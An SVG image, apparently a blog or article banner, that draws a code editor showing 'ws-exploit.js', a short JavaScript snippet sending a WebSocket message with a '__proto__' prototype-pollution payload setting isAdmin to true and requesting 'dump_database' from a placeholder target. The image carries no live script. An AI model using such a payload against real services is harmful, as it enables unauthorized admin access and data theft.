<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="675" viewBox="0 0 1200 675">
    <defs>
        <linearGradient id="bg" x1="0%" y1="0%" x2="100%" y2="100%">
            <stop offset="0%" stop-color="#0F172A" />
            <stop offset="100%" stop-color="#1E293B" />
        </linearGradient>
        <filter id="shadow">
            <feDropShadow dx="0" dy="20" stdDeviation="30" flood-opacity="0.5"/>
        </filter>
        <filter id="glow_ws">
            <feGaussianBlur stdDeviation="3" result="blur" />
            <feMerge>
                <feMergeNode in="blur" />
                <feMergeNode in="SourceGraphic" />
            </feMerge>
        </filter>
    </defs>
    <!-- Background -->
    <rect width="1200" height="675" fill="url(#bg)" />

    <!-- Window -->
    <rect x="100" y="80" width="1000" height="520" rx="12" fill="#1E1E1E" filter="url(#shadow)"/>
    <rect x="100" y="80" width="1000" height="45" rx="12" fill="#2D2D2D" />
    <rect x="100" y="100" width="1000" height="25" fill="#2D2D2D" />
    
    <!-- Traffic lights -->
    <circle cx="130" cy="102" r="7" fill="#FF5F56" />
    <circle cx="155" cy="102" r="7" fill="#FFBD2E" />
    <circle cx="180" cy="102" r="7" fill="#27C93F" />
    
    <text x="600" y="108" fill="#858585" font-family="sans-serif" font-size="14" text-anchor="middle">ws-exploit.js - WebSocket Toolkit</text>

    <!-- Code Editor Content -->
    <g font-family="Consolas, Monaco, monospace" font-size="24" transform="translate(140, 160)">
        <text y="0"><tspan fill="#569CD6">const</tspan> <tspan fill="#9CDCFE">ws</tspan> <tspan fill="#D4D4D4">=</tspan> <tspan fill="#569CD6">new</tspan> <tspan fill="#4EC9B0">WebSocket</tspan><tspan fill="#D4D4D4">(</tspan><tspan fill="#CE9178">"wss://target.api.local/stream"</tspan><tspan fill="#D4D4D4">);</tspan></text>
        
        <text y="45"><tspan fill="#9CDCFE">ws</tspan><tspan fill="#D4D4D4">.</tspan><tspan fill="#DCDCAA">onopen</tspan> <tspan fill="#D4D4D4">=</tspan> <tspan fill="#569CD6">()</tspan> <tspan fill="#569CD6">=&gt;</tspan> <tspan fill="#D4D4D4">&#123;</tspan></text>
        
        <text y="90" x="30"><tspan fill="#9CDCFE">console</tspan><tspan fill="#D4D4D4">.</tspan><tspan fill="#DCDCAA">log</tspan><tspan fill="#D4D4D4">(</tspan><tspan fill="#CE9178">"[*] Connection established. Building payload..."</tspan><tspan fill="#D4D4D4">);</tspan></text>
        
        <text y="150" x="30"><tspan fill="#6A9955">// Exploit: Prototype Pollution to bypass role checks</tspan></text>
        <text y="195" x="30"><tspan fill="#569CD6">const</tspan> <tspan fill="#9CDCFE">adminPayload</tspan> <tspan fill="#D4D4D4">=</tspan> <tspan fill="#D4D4D4">&#123;</tspan></text>
        
        <text y="240" x="60"><tspan fill="#9CDCFE">action</tspan><tspan fill="#D4D4D4">: </tspan><tspan fill="#CE9178">"authenticate"</tspan><tspan fill="#D4D4D4">,</tspan></text>
        <text y="285" x="60"><tspan fill="#9CDCFE">token</tspan><tspan fill="#D4D4D4">: </tspan><tspan fill="#569CD6">null</tspan><tspan fill="#D4D4D4">,</tspan></text>
        <text y="330" x="60"><tspan fill="#CE9178" filter="url(#glow_ws)">"__proto__"</tspan><tspan fill="#D4D4D4">: &#123; </tspan><tspan fill="#9CDCFE">isAdmin</tspan><tspan fill="#D4D4D4">: </tspan><tspan fill="#569CD6">true</tspan><tspan fill="#D4D4D4"> &#125;,</tspan></text>
        <text y="375" x="60"><tspan fill="#9CDCFE">command</tspan><tspan fill="#D4D4D4">: </tspan><tspan fill="#CE9178">"dump_database"</tspan></text>
        
        <text y="420" x="30"><tspan fill="#D4D4D4">&#125;;</tspan></text>
        
        <text y="475" x="30"><tspan fill="#9CDCFE">ws</tspan><tspan fill="#D4D4D4">.</tspan><tspan fill="#DCDCAA">send</tspan><tspan fill="#D4D4D4">(</tspan><tspan fill="#4EC9B0">JSON</tspan><tspan fill="#D4D4D4">.</tspan><tspan fill="#DCDCAA">stringify</tspan><tspan fill="#D4D4D4">(</tspan><tspan fill="#9CDCFE">adminPayload</tspan><tspan fill="#D4D4D4">));</tspan></text>
        <text y="520"><tspan fill="#D4D4D4">&#125;;</tspan></text>
    </g>
</svg>